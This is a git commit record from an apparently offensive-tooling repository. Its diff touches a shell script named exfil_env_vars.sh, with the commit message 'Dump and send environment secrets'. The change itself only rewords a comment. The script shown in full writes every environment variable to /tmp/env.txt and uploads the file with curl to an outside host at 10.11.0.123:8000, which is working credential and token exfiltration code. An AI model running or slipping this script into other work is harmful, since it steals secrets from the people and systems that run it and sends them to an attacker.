e149ca56d407c7ccf80877d2f2178822c1e8d61f
Albetro <albertxang@gmail.com>
2025-07-26 20:32:59 +0300

    Dump and send environment secrets

--- lets_advance/exfiltration/exfil_env_vars.sh
+++ lets_advance/exfiltration/exfil_env_vars.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# Exfil environment variables, useful for creds/tokens
+# Exfil environment variables, useful for credentials/tokens
 
 env > /tmp/env.txt
 curl -X POST -F "file=@/tmp/env.txt" http://10.11.0.123:8000/upload
